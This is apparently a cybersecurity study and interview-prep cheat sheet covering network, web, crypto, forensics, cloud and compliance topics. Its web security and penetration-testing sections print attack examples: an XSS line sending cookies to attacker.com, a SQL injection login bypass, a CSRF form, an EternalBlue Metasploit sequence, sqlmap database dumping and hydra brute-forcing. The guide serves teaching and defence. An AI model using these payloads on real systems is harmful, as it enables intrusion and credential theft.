# Cybersecurity Tech Recap

## Network Security

### TCP/IP Stack
**Purpose**: Foundation of internet communication
```
Application Layer: HTTP, HTTPS, FTP, SSH, DNS
Transport Layer: TCP, UDP
Network Layer: IP, ICMP, ARP
Data Link Layer: Ethernet, WiFi
Physical Layer: Cables, Radio waves
```

### Network Protocols
```bash
# TCP Handshake
1. SYN → 2. SYN-ACK → 3. ACK

# HTTP vs HTTPS
HTTP: Port 80, plaintext
HTTPS: Port 443, TLS encrypted

# DNS Resolution
dig example.com
nslookup example.com
```

### Firewalls & IDS/IPS
```bash
# iptables (Linux firewall)
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# Snort rule (IDS)
alert tcp any any -> 192.168.1.0/24 80 (msg:"HTTP Attack"; content:"../"; sid:1001;)
```

### VPN Technologies
- **IPSec**: Network layer VPN, site-to-site
- **OpenVPN**: SSL/TLS based, flexible
- **WireGuard**: Modern, fast, minimal attack surface
```bash
# OpenVPN client config
client
remote vpn.example.com 1194
proto udp
cert client.crt
key client.key
```

## Web Application Security

### OWASP Top 10
1. **Injection**: SQL, NoSQL, LDAP, OS command injection
2. **Broken Authentication**: Session management flaws
3. **Sensitive Data Exposure**: Weak encryption, plaintext storage
4. **XML External Entities (XXE)**: XML parser vulnerabilities
5. **Broken Access Control**: Unauthorized resource access
6. **Security Misconfiguration**: Default settings, verbose errors
7. **Cross-Site Scripting (XSS)**: Client-side code injection
8. **Insecure Deserialization**: Object injection attacks
9. **Known Vulnerabilities**: Outdated components
10. **Insufficient Logging**: Poor monitoring and response

### SQL Injection
```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '" + input + "' AND password = '" + password + "'

-- Attack payload
admin' OR '1'='1' --

-- Resulting query
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = ''

-- Prevention: Parameterized queries
SELECT * FROM users WHERE username = ? AND password = ?
```

### Cross-Site Scripting (XSS)
```javascript
// Stored XSS
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Reflected XSS
http://vulnerable.com/search?q=<script>alert('XSS')</script>

// DOM-based XSS
document.getElementById('content').innerHTML = location.hash.substring(1);

// Prevention
function escapeHtml(text) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

### Cross-Site Request Forgery (CSRF)
```html
<!-- Malicious form -->
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>

<!-- Prevention: CSRF token -->
<input type="hidden" name="_token" value="random_csrf_token">
```

### Content Security Policy (CSP)
CSP defines allowed content sources to mitigate XSS and data injection attacks.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self'
```
* default-src: fallback
* script-src/style-src/img-src: allowed sources


## Cryptography

### Symmetric Encryption
```python
# AES encryption
from cryptography.fernet import Fernet

# Generate key
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
message = b"Secret message"
encrypted = cipher.encrypt(message)

# Decrypt
decrypted = cipher.decrypt(encrypted)
```

### Asymmetric Encryption
```bash
# RSA key generation
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Encrypt with public key
openssl rsautl -encrypt -inkey public.pem -pubin -in message.txt -out encrypted.bin

# Decrypt with private key
openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out decrypted.txt
```

### Digital Signatures
```python
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# Generate key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# Sign message
message = b"Important message"
signature = private_key.sign(
    message,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)

# Verify signature
public_key.verify(
    signature,
    message,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)
```

### Hashing
```python
import hashlib

# SHA-256
message = "Hello World"
hash_object = hashlib.sha256(message.encode())
hash_hex = hash_object.hexdigest()

# Password hashing with salt
import bcrypt
password = "user_password"
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password.encode(), salt)

# Verify password
bcrypt.checkpw(password.encode(), hashed)
```

## Penetration Testing

### Reconnaissance
```bash
# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com

# Port scanning
nmap -sS -sV -O target.com
nmap -p- --min-rate 1000 target.com

# Directory bruteforcing
dirb http://target.com /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# DNS enumeration
dig @8.8.8.8 target.com any
fierce -dns target.com
```

### Vulnerability Scanning
```bash
# Nessus scan
nessuscli -q localhost 8834 user pass scan new policy_id target_ip scan_name

# OpenVAS
openvas-cli -X '<create_task><name>Scan</name><target>target_ip</target></create_task>'

# Nikto web scanner
nikto -h http://target.com

# SQLmap
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump
```

### Exploitation Frameworks
```bash
# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set LHOST attacker_ip
exploit

# Burp Suite
# Intercept HTTP requests
# Modify parameters
# Test for vulnerabilities

# OWASP ZAP
zap-cli quick-scan http://target.com
zap-cli spider http://target.com
zap-cli active-scan http://target.com
```

## Incident Response

### NIST Framework
1. **Preparation**: Policies, procedures, tools
2. **Detection & Analysis**: Monitoring, investigation
3. **Containment**: Isolate threat, prevent spread
4. **Eradication**: Remove threat from environment
5. **Recovery**: Restore normal operations
6. **Lessons Learned**: Post-incident review

### Digital Forensics
```bash
# Memory dump
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 netscan

# Disk imaging
dd if=/dev/sda of=disk_image.dd bs=4K
ewfacquire /dev/sda -t evidence_file

# File analysis
file suspicious_file
strings suspicious_file
hexdump -C suspicious_file | head -20

# Network analysis
tcpdump -i eth0 -w capture.pcap
wireshark capture.pcap
tshark -r capture.pcap -Y "http.request.method==POST"
```

### Log Analysis
```bash
# Apache logs
tail -f /var/log/apache2/access.log
grep "404" /var/log/apache2/access.log | head -10

# System logs
journalctl -f
grep "Failed password" /var/log/auth.log

# Windows Event Logs
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}
```

## Malware Analysis

### Static Analysis
```bash
# File information
file malware.exe
objdump -x malware.exe
strings malware.exe | grep -i "http\|ftp\|\.dll"

# Packing detection
peid malware.exe
upx -t malware.exe

# Hash calculation
md5sum malware.exe
sha256sum malware.exe

# VirusTotal API
curl -X POST 'https://www.virustotal.com/vtapi/v2/file/scan' -F 'key=YOUR_API_KEY' -F 'file=@malware.exe'
```

### Dynamic Analysis
```bash
# Sandbox analysis
cuckoo submit malware.exe
cuckoo analysis info 1

# Process monitoring
strace -f -e trace=open,write,network ./malware
ltrace ./malware

# Network monitoring
netstat -tulpn
tcpdump -i any -w malware_traffic.pcap

# File system monitoring
inotifywait -m -r /tmp/
```

### Reverse Engineering
```bash
# Disassembly
objdump -d malware.exe
radare2 malware.exe
gdb malware.exe

# Decompilation
retdec-decompiler malware.exe
ghidra malware.exe
```

## Cloud Security

### AWS Security
```bash
# IAM policies
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-bucket/*"
    }
  ]
}

# S3 bucket policy
aws s3api put-bucket-policy --bucket my-bucket --policy file://policy.json

# CloudTrail logs
aws logs describe-log-groups
aws logs filter-log-events --log-group-name CloudTrail --filter-pattern "ERROR"

# Security Groups
aws ec2 describe-security-groups
aws ec2 authorize-security-group-ingress --group-id sg-12345678 --protocol tcp --port 22 --cidr 10.0.0.0/8
```

### Container Security
```dockerfile
# Secure Dockerfile
FROM alpine:3.14
RUN adduser -D -s /bin/sh appuser
USER appuser
COPY --chown=appuser:appuser app /app
WORKDIR /app
CMD ["./app"]
```

```bash
# Docker security scanning
docker scan image:tag
trivy image image:tag

# Kubernetes security
kubectl get pods --all-namespaces
kubectl describe pod pod-name
kubectl logs pod-name

# Network policies
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

## Identity & Access Management

### Active Directory
```powershell
# User management
New-ADUser -Name "John Doe" -SamAccountName "jdoe" -UserPrincipalName "jdoe@domain.com"
Get-ADUser -Filter "Name -like '*John*'"
Set-ADAccountPassword -Identity jdoe -Reset -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)

# Group management
New-ADGroup -Name "Security Team" -GroupScope Global
Add-ADGroupMember -Identity "Security Team" -Members jdoe

# Password policy
Get-ADDefaultDomainPasswordPolicy
Set-ADDefaultDomainPasswordPolicy -MinPasswordLength 12 -PasswordHistoryCount 24
```

### LDAP
```bash
# LDAP search
ldapsearch -x -H ldap://dc.example.com -D "cn=admin,dc=example,dc=com" -W -b "dc=example,dc=com" "(objectClass=person)"

# Add user
ldapadd -x -H ldap://dc.example.com -D "cn=admin,dc=example,dc=com" -W -f newuser.ldif
```

### Single Sign-On (SSO)
```xml
<!-- SAML Assertion -->
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">user@example.com</saml:NameID>
  </saml:Subject>
  <saml:AttributeStatement>
    <saml:Attribute Name="Role">
      <saml:AttributeValue>Admin</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>
```

## Mobile Security

### Android Security
```java
// Permission check
if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, CAMERA_REQUEST_CODE);
}

// Secure storage
SharedPreferences sharedPrefs = getSharedPreferences("secure_prefs", Context.MODE_PRIVATE);
SharedPreferences.Editor editor = sharedPrefs.edit();
editor.putString("api_key", encryptedApiKey);
editor.apply();

// Certificate pinning
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("example.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    .build();
```

### iOS Security
```swift
// Keychain storage
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "userAccount",
    kSecValueData as String: password.data(using: .utf8)!
]
SecItemAdd(query as CFDictionary, nil)

// App Transport Security
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>
</dict>
```

## Compliance & Governance

### GDPR
- **Data Protection Principles**: Lawfulness, fairness, transparency
- **Rights**: Access, rectification, erasure, portability
- **Data Protection Impact Assessment (DPIA)**
- **Breach notification**: 72 hours to authorities

### PCI DSS
- **Requirements**: 
  1. Firewall configuration
  2. Default passwords
  3. Cardholder data protection
  4. Encrypted transmission
  5. Antivirus software
  6. Secure systems
  7. Access control
  8. Unique IDs
  9. Physical access
  10. Network monitoring
  11. Regular testing
  12. Security policy

### ISO 27001
- **ISMS**: Information Security Management System
- **Risk Assessment**: Identify, analyze, evaluate risks
- **Controls**: Technical, organizational, physical

## Security Tools & Commands

### Network Analysis
```bash
# Nmap
nmap -sS -sV -sC -O target.com
nmap --script vuln target.com
nmap -p- --min-rate 1000 target.com

# Netcat
nc -l -p 4444
nc target.com 80
nc -z target.com 20-100

# Tcpdump
tcpdump -i eth0 -s 65535 -w capture.pcap
tcpdump -r capture.pcap 'port 80'
tcpdump -i eth0 'src host 192.168.1.1 and dst port 22'
```

### Web Application Testing
```bash
# Burp Suite CLI
java -jar burpsuite_pro.jar --project-file=project.burp --config-file=config.json

# OWASP ZAP
zap.sh -cmd -quickurl http://target.com
zap.sh -cmd -port 8080 -host 0.0.0.0

# Wfuzz
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://target.com/FUZZ

# Ffuf
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://target.com/FUZZ
```

### Password Attacks
```bash
# Hashcat
hashcat -m 0 hashes.txt wordlist.txt
hashcat -m 1000 ntlm_hashes.txt wordlist.txt
hashcat -a 3 -m 0 hash.txt ?d?d?d?d?d?d?d?d

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
john --rules --wordlist=wordlist.txt hashes.txt
john --show hashes.txt

# Hydra
hydra -L users.txt -P passwords.txt ssh://target.com
hydra -l admin -P passwords.txt http-post-form://target.com/login.php:"username=^USER^&password=^PASS^:F=incorrect"
```

### Forensics Tools
```bash
# Autopsy
autopsy

# Sleuth Kit
fls -r disk_image.dd
icat disk_image.dd 1234 > recovered_file.txt

# Volatility
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 connections
volatility -f memory.dump --profile=Win7SP1x64 malfind
```

## Common Interview Questions

### Network Security
- **TCP vs UDP**: Connection-oriented vs connectionless
- **SSL/TLS Handshake**: Certificate exchange, key agreement
- **VPN Types**: Site-to-site, remote access, SSL VPN
- **Firewall Types**: Packet filtering, stateful, application layer

### Web Security
- **OWASP Top 10**: Most critical web vulnerabilities
- **XSS Types**: Stored, reflected, DOM-based
- **CSRF Protection**: Tokens, same-site cookies
- **SQL Injection**: Prevention with parameterized queries

### Cryptography
- **Symmetric vs Asymmetric**: Speed vs key distribution
- **Hash Functions**: MD5, SHA-1, SHA-256 properties
- **Digital Signatures**: Authentication, non-repudiation
- **PKI**: Certificate authorities, trust chains

### Incident Response
- **NIST Framework**: Prepare, detect, contain, eradicate, recover
- **Evidence Handling**: Chain of custody, forensics procedures
- **Log Analysis**: SIEM, correlation, threat hunting
- **Communication**: Internal teams, external stakeholders

### Risk Management
- **Risk Assessment**: Threat, vulnerability, impact
- **Risk Treatment**: Accept, avoid, mitigate, transfer
- **Compliance**: GDPR, PCI DSS, HIPAA, SOX
- **Business Continuity**: Disaster recovery, backup strategies

### Access Control
- **AAA**: Authentication, authorization, accounting
- **Identity Federation**: SAML, OAuth, OpenID Connect
- **Privilege Escalation**: Vertical vs horizontal
- **Zero Trust**: Never trust, always verify

### Malware Analysis
- **Static vs Dynamic**: Code analysis vs runtime behavior
- **Packing**: Code obfuscation techniques
- **Indicators of Compromise**: Files, network, registry
- **Sandboxing**: Isolated execution environments

This comprehensive guide covers essential cybersecurity concepts, tools, and techniques for defensive security operations and interview preparation.